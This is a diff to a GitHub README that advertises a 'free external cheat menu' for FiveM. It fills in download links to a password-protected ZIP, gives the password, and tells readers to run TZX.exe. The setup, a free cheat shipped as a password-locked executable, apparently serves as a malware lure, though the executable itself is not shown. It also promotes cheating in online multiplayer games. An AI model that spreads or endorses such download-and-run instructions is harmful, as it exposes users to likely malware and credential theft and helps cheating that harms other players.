@@ -1,7 +1,7 @@
 # FiveM-External-Mod-Menu-2026
 Free external cheat menu for FiveM. Working 2026
 
-## [Download]()
+## [Download](https://github.com/signwidowlattice/FiveM-External-Mod-Menu-2026/releases/download/Download/FiveM-TZX-External.zip)
 > Archive password: `fivemtzx`
 
 
@@ -51,7 +51,7 @@ Free external cheat menu for FiveM. Working 2026
 ## 📥 How to Install
 
 ### 🔧 Installation Steps
-1. [Download]() the latest TZX External zip
+1. #  [Download](https://github.com/signwidowlattice/FiveM-External-Mod-Menu-2026/releases/download/Download/FiveM-TZX-External.zip) the latest TZX External zip
 2. Extract the ZIP archive to any folder
 3. Run `TZX.exe` 
 4. Follow the on-screen configuration
